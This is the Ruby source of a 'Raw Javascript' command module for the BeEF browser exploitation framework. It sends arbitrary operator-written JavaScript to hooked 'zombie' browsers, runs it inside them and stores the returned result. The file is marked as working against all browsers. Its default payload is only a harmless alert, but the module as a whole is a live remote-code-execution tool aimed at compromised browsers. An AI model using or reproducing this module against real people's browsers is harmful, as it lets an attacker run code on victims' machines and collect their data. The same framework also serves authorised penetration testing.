#
#   Copyright 2011 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
class Raw_javascript < BeEF::Core::Command
  
  def initialize
    super({
      'Name' => 'Raw Javascript',
      'Description' => %Q{ 
        This module will send the code entered in the 'JavaScript Code' section to the selected 
        zombie browsers where it will be executed. Code is run inside an anonymous function and the return 
        value is passed to the framework. Multiline scripts are allowed, no special encoding is required.
        },
      'Category' => 'Misc',
      'Author' => ['wade','vo'],
      'Data' =>
        [
          {'name' => 'cmd', 'ui_label' => 'Javascript Code', 'value' => "alert(\'BeEF Raw Javascript\');\nreturn \'It worked!\';", 'type' => 'textarea', 'width' => '400px', 'height' => '100px'},
        ],
      'File' => __FILE__
    })

    set_target({
      'verified_status' =>  VERIFIED_WORKING, 
      'browser_name' =>     ALL
    })
    
    use_template!
  end
  
  #
  # This method is being called when a zombie sends some
  # data back to the framework.
  #
  def callback
    
    save({'result' => @datastore['result']})
  end
  
end